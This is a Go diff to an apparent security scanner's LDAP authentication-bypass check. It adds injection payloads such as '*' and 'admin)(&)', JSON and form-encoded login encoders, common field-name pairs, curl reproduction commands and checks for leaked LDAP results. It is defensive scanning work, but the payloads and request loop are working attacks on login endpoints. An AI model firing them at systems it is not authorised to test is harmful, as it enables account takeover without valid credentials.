@@ -27,6 +27,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -980,108 +981,170 @@ func checkLDAPAuthBypass(ctx context.Context, client *http.Client, asset, base s
 		username string
 		label    string
 	}{
+		{"*", "wildcard match all"},
 		{"*)(uid=*))(|(uid=*", "wildcard uid filter"},
 		{"admin)(|(objectclass=*", "objectclass wildcard bypass"},
 		{"*)(userPassword=*", "userPassword attribute extraction"},
+		{"admin)(&)", "always-true AND bypass"},
+	}
+
+	// loginFormat defines how to encode login credentials for a POST request.
+	type loginFormat struct {
+		contentType string
+		// encode returns the request body for the given username and password.
+		encode func(userField, passField, username, password string) []byte
+		// proofCmd returns a curl command for reproduction.
+		proofCmd func(target, userField, passField, username string) string
+	}
+
+	jsonFormat := loginFormat{
+		contentType: "application/json",
+		encode: func(userField, passField, username, password string) []byte {
+			return []byte(fmt.Sprintf(`{%q:%q,%q:%q}`, userField, username, passField, password))
+		},
+		proofCmd: func(target, userField, passField, username string) string {
+			return fmt.Sprintf(`curl -s -X POST '%s' -H 'Content-Type: application/json' -d '{%q:%q,%q:"test"}'`,
+				target, userField, username, passField)
+		},
+	}
+
+	formFormat := loginFormat{
+		contentType: "application/x-www-form-urlencoded",
+		encode: func(userField, passField, username, password string) []byte {
+			vals := url.Values{}
+			vals.Set(userField, username)
+			vals.Set(passField, password)
+			return []byte(vals.Encode())
+		},
+		proofCmd: func(target, userField, passField, username string) string {
+			return fmt.Sprintf(`curl -s -X POST '%s' --data-urlencode '%s=%s' -d '%s=test'`,
+				target, userField, username, passField)
+		},
+	}
+
+	// Common field name pairs for username and password.
+	fieldPairs := []struct{ user, pass string }{
+		{"username", "password"},
+		{"user", "pass"},
+		{"login", "password"},
+		{"email", "password"},
 	}
 
 	for _, path := range loginPaths {
 		target := base + path
 
-		// First check if the login endpoint exists with a normal failed login.
-		normalPayload := []byte(`{"username":"beacon-test-user","password":"beacon-test-pass"}`)
-		normalReq, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(normalPayload))
-		if err != nil {
-			continue
-		}
-		normalReq.Header.Set("Content-Type", "application/json")
-		normalReq.Header.Set("Accept", "application/json")
-
-		normalResp, err := client.Do(normalReq)
-		if err != nil {
-			continue
-		}
-		normalBody, _ := io.ReadAll(io.LimitReader(normalResp.Body, 64*1024))
-		_ = normalResp.Body.Close()
-
-		// Only test endpoints that return 401 or 200 with an error body for bad creds.
-		normalStatus := normalResp.StatusCode
-		if normalStatus == http.StatusNotFound || normalStatus == http.StatusMethodNotAllowed {
-			continue
-		}
-
-		for _, bp := range bypassPayloads {
-			injectedPayload := []byte(fmt.Sprintf(
-				`{"username":"%s","password":"beacon-test-pass"}`, bp.username))
-			injectedReq, err := http.NewRequestWithContext(ctx, http.MethodPost, target,
-				bytes.NewReader(injectedPayload))
-			if err != nil {
-				continue
-			}
-			injectedReq.Header.Set("Content-Type", "application/json")
-			injectedReq.Header.Set("Accept", "application/json")
-
-			injectedResp, err := client.Do(injectedReq)
-			if err != nil {
-				continue
-			}
-			injectedBody, _ := io.ReadAll(io.LimitReader(injectedResp.Body, 64*1024))
-			_ = injectedResp.Body.Close()
-
-			injectedBodyStr := string(injectedBody)
-
-			// Auth bypass indicators:
-			// 1. Normal login fails (401) but injected login succeeds (200)
-			// 2. Response contains auth tokens/session indicators
-			// 3. Response body is significantly different and contains auth artifacts
-			authBypassed := false
-
-			if normalStatus == http.StatusUnauthorized && injectedResp.StatusCode == http.StatusOK {
-				authBypassed = true
-			}
-
-			if injectedResp.StatusCode == http.StatusOK &&
-				(strings.Contains(injectedBodyStr, `"token"`) ||
-					strings.Contains(injectedBodyStr, `"access_token"`) ||
-					strings.Contains(injectedBodyStr, `"session"`) ||
-					strings.Contains(injectedBodyStr, `"jwt"`)) {
-				// Verify the normal response didn't also contain tokens (e.g. guest mode).
-				normalBodyStr := string(normalBody)
-				if !strings.Contains(normalBodyStr, `"token"`) &&
-					!strings.Contains(normalBodyStr, `"access_token"`) {
-					authBypassed = true
+		for _, format := range []loginFormat{jsonFormat, formFormat} {
+			for _, fields := range fieldPairs {
+				// First check if the login endpoint exists with a normal failed login.
+				normalPayload := format.encode(fields.user, fields.pass, "beacon-test-user", "beacon-test-pass")
+				normalReq, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(normalPayload))
+				if err != nil {
+					continue
 				}
-			}
+				normalReq.Header.Set("Content-Type", format.contentType)
 
-			if authBypassed {
-				return &finding.Finding{
-					CheckID:  finding.CheckLDAPAuthBypass,
-					Module:   "deep",
-					Scanner:  scannerName,
-					Severity: finding.SeverityCritical,
-					Title:    fmt.Sprintf("LDAP authentication bypass via injection at %s", target),
-					Description: fmt.Sprintf(
-						"The login endpoint at %s is vulnerable to LDAP authentication bypass. "+
-							"The payload %q (%s) caused a successful authentication response (HTTP %d) "+
-							"while a normal login attempt returned HTTP %d. The application interpolates "+
-							"user input directly into an LDAP bind or search filter, allowing an attacker "+
-							"to authenticate as any user without valid credentials.",
-						target, bp.username, bp.label,
-						injectedResp.StatusCode, normalStatus),
-					Asset: asset,
-					ProofCommand: fmt.Sprintf(
-						`curl -s -X POST '%s' -H 'Content-Type: application/json' -d '{"username":"%s","password":"test"}'`,
-						target, bp.username),
-					Evidence: map[string]any{
-						"url":             target,
-						"payload":         bp.username,
-						"payload_label":   bp.label,
-						"normal_status":   normalStatus,
-						"injected_status": injectedResp.StatusCode,
-						"body_snippet":    truncate(injectedBodyStr, 300),
-					},
-					DeepOnly:     true,
-					DiscoveredAt: time.Now(),
+				normalResp, err := client.Do(normalReq)
+				if err != nil {
+					continue
+				}
+				normalBody, _ := io.ReadAll(io.LimitReader(normalResp.Body, 64*1024))
+				_ = normalResp.Body.Close()
+
+				// Only test endpoints that return 401 or 200 with an error body for bad creds.
+				normalStatus := normalResp.StatusCode
+				if normalStatus == http.StatusNotFound || normalStatus == http.StatusMethodNotAllowed {
+					continue
+				}
+
+				for _, bp := range bypassPayloads {
+					injectedPayload := format.encode(fields.user, fields.pass, bp.username, "beacon-test-pass")
+					injectedReq, err := http.NewRequestWithContext(ctx, http.MethodPost, target,
+						bytes.NewReader(injectedPayload))
+					if err != nil {
+						continue
+					}
+					injectedReq.Header.Set("Content-Type", format.contentType)
+
+					injectedResp, err := client.Do(injectedReq)
+					if err != nil {
+						continue
+					}
+					injectedBody, _ := io.ReadAll(io.LimitReader(injectedResp.Body, 64*1024))
+					_ = injectedResp.Body.Close()
+
+					injectedBodyStr := string(injectedBody)
+
+					// Auth bypass indicators:
+					// 1. Normal login fails (401) but injected login succeeds (200)
+					// 2. Response contains auth tokens/session indicators
+					// 3. Response body is significantly different and contains auth artifacts
+					// 4. LDAP error message leakage in injected response
+					authBypassed := false
+
+					if normalStatus == http.StatusUnauthorized && injectedResp.StatusCode == http.StatusOK {
+						authBypassed = true
+					}
+
+					// Check for "Found user" or similar LDAP result indicators that
+					// appear in injected responses but not in normal (failed) ones.
+					if injectedResp.StatusCode == http.StatusOK {
+						normalBodyStr := string(normalBody)
+						hasLDAPResult := strings.Contains(injectedBodyStr, "Found user") ||
+							strings.Contains(injectedBodyStr, "dn=") ||
+							strings.Contains(injectedBodyStr, "dc=") ||
+							strings.Contains(injectedBodyStr, "cn=")
+						normalHasResult := strings.Contains(normalBodyStr, "Found user") ||
+							strings.Contains(normalBodyStr, "dn=") ||
+							strings.Contains(normalBodyStr, "dc=") ||
+							strings.Contains(normalBodyStr, "cn=")
+						if hasLDAPResult && !normalHasResult {
+							authBypassed = true
+						}
+					}
+
+					if injectedResp.StatusCode == http.StatusOK &&
+						(strings.Contains(injectedBodyStr, `"token"`) ||
+							strings.Contains(injectedBodyStr, `"access_token"`) ||
+							strings.Contains(injectedBodyStr, `"session"`) ||
+							strings.Contains(injectedBodyStr, `"jwt"`)) {
+						normalBodyStr := string(normalBody)
+						if !strings.Contains(normalBodyStr, `"token"`) &&
+							!strings.Contains(normalBodyStr, `"access_token"`) {
+							authBypassed = true
+						}
+					}
+
+					if authBypassed {
+						return &finding.Finding{
+							CheckID:  finding.CheckLDAPAuthBypass,
+							Module:   "deep",
+							Scanner:  scannerName,
+							Severity: finding.SeverityCritical,
+							Title:    fmt.Sprintf("LDAP authentication bypass via injection at %s", target),
+							Description: fmt.Sprintf(
+								"The login endpoint at %s is vulnerable to LDAP authentication bypass. "+
+									"The payload %q (%s) caused a successful authentication response (HTTP %d) "+
+									"while a normal login attempt returned HTTP %d. The application interpolates "+
+									"user input directly into an LDAP bind or search filter, allowing an attacker "+
+									"to authenticate as any user without valid credentials.",
+								target, bp.username, bp.label,
+								injectedResp.StatusCode, normalStatus),
+							Asset: asset,
+							ProofCommand: format.proofCmd(target, fields.user, fields.pass, bp.username),
+							Evidence: map[string]any{
+								"url":             target,
+								"payload":         bp.username,
+								"payload_label":   bp.label,
+								"field_name":      fields.user,
+								"content_type":    format.contentType,
+								"normal_status":   normalStatus,
+								"injected_status": injectedResp.StatusCode,
+								"body_snippet":    truncate(injectedBodyStr, 300),
+							},
+							DeepOnly:     true,
+							DiscoveredAt: time.Now(),
+						}
+					}
 				}
 			}
 		}
